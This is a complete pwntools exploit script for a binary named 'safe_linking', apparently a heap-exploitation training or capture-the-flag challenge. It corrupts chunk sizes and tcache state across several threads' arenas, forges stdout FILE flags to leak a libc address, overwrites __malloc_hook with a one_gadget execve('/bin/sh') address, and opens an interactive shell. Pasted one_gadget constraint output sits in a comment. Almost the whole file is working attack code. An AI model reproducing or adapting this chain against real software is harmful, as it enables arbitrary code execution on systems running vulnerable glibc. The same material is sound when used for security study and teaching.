#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_linking")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = f'''
monitor set libthread-db-search-path {elf.runpath.decode()}
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Current thread & indices.
cur_thread = 1
indices = [0, 0, 0, 0]

# Select the "malloc" option; send size.
# Returns current thread's chunk index.
def malloc(size):
    global indices
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    indices[cur_thread-1] += 1
    return indices[cur_thread-1] - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data, discard=True):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    if discard: io.recvuntil(b"> ")

# Select "new thread" option.
def new_thread():
    io.send(b"4")
    io.recvuntil(b"> ")

# Select "switch thread" option; send thread number.
def switch_thread(thread):
    global cur_thread
    cur_thread = thread
    io.send(b"5")
    io.sendafter(b"thread: ", f"{thread}".encode())
    io.recvuntil(b"> ")

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Create new threads.
new_thread() # Thread 2.
new_thread() # Thread 3.

# Request 2 chunks in thread 1.
t1_A = malloc(0x18)
t1_B = malloc(0x18)

# Switch to thread 2 & allocate to create a 2nd arena.
switch_thread(2)
t2_A = malloc(0x18)

# Switch to thread 3 & allocate to join the main arena.
switch_thread(3)
t3_A = malloc(0x238)
t3_B = malloc(0x18) #guard

switch_thread(1)

edit(t1_A, b"Y" * 24 + p16( 0x20 + 0x290 + 0x240 + 1)) # B will be overwrite size

free(t1_B)

t1_c = malloc(0xa8)
t1_d = malloc(0x428)

edit(t1_c, p16(0) * 18 + p16(2) + p16(2))

edit(t1_d, p16(libc.sym["_IO_2_1_stdout_"] & 0xfff))

# Overwrite io_write_base to leak chain ptr
IO_MAGIC = 0xfabd0000
nowrites = 0x8
ioputting = 0x800
ioappending = 0x1000
flags = IO_MAGIC | ioputting | ioappending 

switch_thread(3)
fake_fs = malloc(0x38)
edit(fake_fs, p64(flags) + p64(0) * 3 + p8(0x28), False)

leak = io.recvline()
iostdin = u64(leak[:8])

libc.address = iostdin - libc.sym["_IO_2_1_stdin_"]

info("Libc base: " + hex(libc.address))

switch_thread(1)
edit(t1_d, p64(libc.sym["__malloc_hook"]) + p64(libc.sym["__malloc_hook"]))

'''
0xc50af execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL
  [r12] == NULL || r12 == NULL

0xc50d6 execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  [rbp-0x40] == NULL || rbp-0x40 == NULL
  [r12] == NULL || r12 == NULL

0xe2ae6 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x30], 0, rsp+0x70, [rsp+0x170])
constraints:
  [rsp+0x70] == NULL
  [[rsp+0x170]] == NULL || [rsp+0x170] == NULL
  [rsp+0x30] == NULL || (s32)[[rsp+0x30]+0x4] <= 0

0xe2aee posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x30], 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  [rsp+0x30] == NULL || (s32)[[rsp+0x30]+0x4] <= 0

0xe2af3 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
'''
switch_thread(3)
win = malloc(0x38)
edit(win, p64(libc.address + 0xc50af))

# =============================================================================

io.interactive()
